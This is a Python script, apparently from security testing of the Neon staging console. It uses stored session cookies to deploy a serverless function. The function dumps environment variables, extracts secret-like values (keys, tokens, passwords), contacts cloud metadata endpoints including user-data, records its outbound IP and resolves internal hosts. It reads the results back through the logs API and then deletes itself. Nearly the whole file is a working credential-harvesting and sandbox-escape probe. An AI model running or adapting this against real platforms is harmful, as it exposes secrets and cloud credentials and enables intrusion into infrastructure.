# -*- coding: utf-8 -*-
"""函数运行时探测(module-scope 自执行 + console.log 通道):
1. logs/query 空查询基线(响应结构)
2. 部署探测函数:env 全量/出网 IP/metadata/DNS
3. 轮询 logs/query 读 PROBE_RESULT
4. 清理函数"""
import http.client, ssl, json, re, html, os, sys, time, io, zipfile, uuid

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE, HEADERS_TEST, cookie_str

ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
PID, BID = ctxj['pid'], ctxj['bid']

def ctl_req(method, path, body=None, ctype='application/json', raw_body=None):
    conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r = conn.getresponse()
    r.read()
    fresh = {}
    for sc in r.headers.get_all('Set-Cookie') or []:
        m = re.match(r'([^=]+)=([^;]*)', sc)
        if m:
            fresh[m.group(1)] = m.group(2)
    conn.close()
    conn2 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    conn2.request('GET', '/', headers={'User-Agent': 'Mozilla/5.0', 'Cookie': cookie_str()})
    r2 = conn2.getresponse()
    txt = r2.read().decode('utf-8', 'replace')
    conn2.close()
    m = re.search(r'<meta name="csrf-token" content="([^"]+)"', txt)
    csrf = html.unescape(m.group(1)) if m else None
    parts = []
    for c in cookie_str().split(';'):
        c = c.strip()
        if c.startswith('_gorilla_csrf=') and '_gorilla_csrf' in fresh:
            parts.append('_gorilla_csrf=' + fresh['_gorilla_csrf'])
        else:
            parts.append(c)
    conn3 = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=90)
    hdrs = {'Cookie': '; '.join(parts), 'User-Agent': 'Mozilla/5.0'}
    hdrs.update(HEADERS_TEST)
    if ctype:
        hdrs['Content-Type'] = ctype
    if csrf:
        hdrs['X-CSRF-Token'] = csrf
    data = raw_body if raw_body is not None else (json.dumps(body).encode() if body is not None else None)
    conn3.request(method, path, body=data, headers=hdrs)
    r3 = conn3.getresponse()
    out = r3.read().decode('utf-8', 'ignore')
    conn3.close()
    return r3.status, out

print('=== [0] logs/query 基线 ===', flush=True)
st, raw = ctl_req('POST', API_BASE + '/projects/%s/branches/%s/logs/query' % (PID, BID), {'since': '30m'})
print('-> %d %s' % (st, raw[:400].replace('\n', ' ')), flush=True)

PROBE = r'''const sleep = (ms) => new Promise(r => setTimeout(r, ms));
async function t(url, ms) {
  try {
    const r = await fetch(url, { signal: AbortSignal.timeout(ms), redirect: 'follow' });
    const tx = await r.text();
    return r.status + ' len=' + tx.length + ' ' + tx.slice(0, 400).replace(/\s+/g, ' ');
  } catch (e) { return 'ERR ' + (e && e.message ? e.message : e); }
}
async function probe() {
  await sleep(1500);
  const envAll = Object.keys(process.env).sort();
  console.log('PROBE_A env_all=' + JSON.stringify(envAll));
  const sens = {};
  for (const k of envAll) {
    if (/KEY|TOKEN|SECRET|PASS|URL|HOST|AUTH|DATABASE|PG|AWS|NEON|ENDPOINT|REGION|CELL|ROLE|USER|CERT|DNS|ID/i.test(k)) {
      const v = process.env[k] || '';
      sens[k] = v.length > 250 ? v.slice(0, 250) + '...' : v;
    }
  }
  console.log('PROBE_B env_vals=' + JSON.stringify(sens));
  console.log('PROBE_C ipify=' + await t('https://api.ipify.org?format=json', 8000));
  for (const u of [
    'http://169.254.169.254/latest/meta-data/',
    'http://169.254.169.254/latest/dynamic/instance-identity/document',
    'http://169.254.169.254/latest/user-data/',
    'http://100.100.100.200/latest/meta-data/',
  ]) {
    console.log('PROBE_E ' + u + ' => ' + await t(u, 4000));
  }
  const hosts = ['ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build',
                 'console-stage.neon.build',
                 'neonauth.us-east-2.aws.neon.build',
                 'br-wandering-field-w2ob6mpn.compute.c-1.us-east-2.aws.neon.build'];
  try {
    const dns = await import('node:dns');
    for (const h of hosts) {
      try {
        const addrs = await dns.promises.resolve4(h);
        console.log('PROBE_F dns ' + h + ' => ' + JSON.stringify(addrs));
      } catch (e) { console.log('PROBE_F dns ' + h + ' ERR ' + (e.message || e)); }
    }
  } catch (e) { console.log('PROBE_F import ERR ' + e.message); }
  console.log('PROBE_G done');
}
probe();
export default { fetch: async (req) => new Response('ok') };
'''

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.js', PROBE)
    z.writestr('package.json', '{"name":"probe","type":"module","main":"index.js"}')
buf.seek(0)
zip_bytes = buf.read()

SLUG = 'secprobe' + uuid.uuid4().hex[:6]
FP = '/projects/%s/branches/%s/functions' % (PID, BID)
print('\n=== [1] deploy probe fn %s (zip %d) ===' % (SLUG, len(zip_bytes)), flush=True)
boundary = '----b' + uuid.uuid4().hex
body = (('--' + boundary + '\r\nContent-Disposition: form-data; name="zip"; filename="b.zip"\r\nContent-Type: application/zip\r\n\r\n').encode()
        + zip_bytes + b'\r\n'
        + ('--' + boundary + '\r\nContent-Disposition: form-data; name="runtime"\r\n\r\nnodejs24\r\n').encode()
        + ('--' + boundary + '--\r\n').encode())
st, raw = ctl_req('POST', API_BASE + FP + '/' + SLUG + '/deployments', None,
                  ctype='multipart/form-data; boundary=' + boundary, raw_body=body)
print('deploy -> %d %s' % (st, raw[:250]), flush=True)

print('\n=== [2] poll status/logs ===', flush=True)
seen = set()
for i in range(15):
    time.sleep(5)
    st, raw = ctl_req('GET', API_BASE + FP + '/' + SLUG)
    status = ''
    try:
        status = json.loads(raw)['function']['current_deployment'].get('status', '')
    except Exception:
        pass
    st2, raw2 = ctl_req('POST', API_BASE + '/projects/%s/branches/%s/logs/query' % (PID, BID),
                        {'since': '5m', 'body_contains': 'PROBE_'})
    try:
        for lg in json.loads(raw2).get('logs', []):
            msg = lg.get('message') or lg.get('line') or str(lg)
            if isinstance(msg, str) and 'PROBE_' in msg and msg not in seen:
                seen.add(msg)
                print('LOG: %s' % msg[:600], flush=True)
    except Exception:
        pass
    if 'completed' in status or 'failed' in status:
        print('fn status=%s log rows=%d' % (status, len(seen)), flush=True)
    if len(seen) >= 8:
        break

if len(seen) < 8:
    print('waiting extra 30s...', flush=True)
    time.sleep(30)
    st2, raw2 = ctl_req('POST', API_BASE + '/projects/%s/branches/%s/logs/query' % (PID, BID),
                        {'since': '10m', 'body_contains': 'PROBE_'})
    try:
        for lg in json.loads(raw2).get('logs', []):
            msg = lg.get('message') or lg.get('line') or str(lg)
            if isinstance(msg, str) and 'PROBE_' in msg and msg not in seen:
                seen.add(msg)
                print('LOG: %s' % msg[:600], flush=True)
    except Exception as e:
        print('final log err:', e, raw2[:200], flush=True)

st, raw = ctl_req('DELETE', API_BASE + FP + '/' + SLUG)
print('cleanup %s -> %d' % (SLUG, st), flush=True)
